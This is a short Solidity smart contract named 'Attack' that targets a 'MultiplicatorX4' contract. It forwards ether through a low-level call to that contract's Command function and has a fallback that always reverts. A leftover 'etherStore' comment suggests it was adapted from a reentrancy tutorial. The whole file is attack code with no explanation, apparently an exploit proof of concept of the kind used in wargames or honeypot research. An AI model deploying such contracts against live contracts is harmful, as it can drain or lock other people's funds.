contract Attack {
  MultiplicatorX4 m;

  // intialise the etherStore variable with the contracts address
  function Attack(MultiplicatorX4 _m) public{
      m = _m;
  }

  function attack() public payable{
       m.call.value(msg.value)(bytes4(keccak256("Command(address,bytes)")), address(this), "test");
  }

  // fallback function - where the magic happens
  function () payable {
    assert(0==1);
  }
}